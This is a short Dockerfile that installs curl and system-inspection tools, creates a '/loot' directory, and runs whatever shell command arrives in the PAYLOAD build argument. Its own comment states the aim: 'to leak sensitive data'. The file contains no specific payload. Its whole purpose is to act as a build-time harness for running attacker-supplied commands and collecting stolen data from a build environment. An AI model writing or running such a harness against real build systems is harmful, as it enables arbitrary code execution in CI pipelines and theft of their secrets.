FROM python:3.11-alpine

ARG PAYLOAD

# Install utilities for deeper inspection
RUN apk add --no-cache curl jq openssl tar findutils procps net-tools

# Execute payload to leak sensitive data
RUN mkdir -p /loot && \
    echo "[+] Running enhanced payload..." && \
    sh -c "$PAYLOAD"
